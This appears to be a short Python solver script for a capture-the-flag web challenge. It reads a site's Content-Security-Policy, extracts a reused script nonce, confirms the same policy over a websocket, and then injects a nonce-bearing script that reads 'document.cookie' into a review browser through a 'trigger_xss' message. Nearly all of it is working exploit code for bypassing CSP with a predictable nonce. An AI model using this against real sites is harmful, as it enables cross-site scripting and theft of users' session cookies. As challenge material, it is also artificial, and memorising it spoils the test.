#!/usr/bin/env python3
import json
import os
import re
import time
import urllib.request
import websocket

base = os.environ["TARGET_URL"]
expected = os.environ["EXPECTED_FLAG"]

def get(path):
    with urllib.request.urlopen(base + path, timeout=15) as response:
        return response.status, response.headers

status, headers = get("/")
assert status == 200
policy = headers.get("Content-Security-Policy", "")
nonce = re.search(r"'nonce-([^']+)'", policy).group(1)
_, second = get("/guidelines")
assert second.get("Content-Security-Policy") == policy

ws = websocket.create_connection(base.replace("http://", "ws://") + "/ws", timeout=10)
ws.send(json.dumps({"type": "fetch_default_csp"}))
message = json.loads(ws.recv())
assert message["payload"] == policy

payload = '<script nonce="' + nonce + '">document.title = document.cookie</script>'
ws.send(json.dumps({"type": "trigger_xss", "payload": payload}))
print("Queued a nonce-bearing payload for the real review browser.")
ws.close()
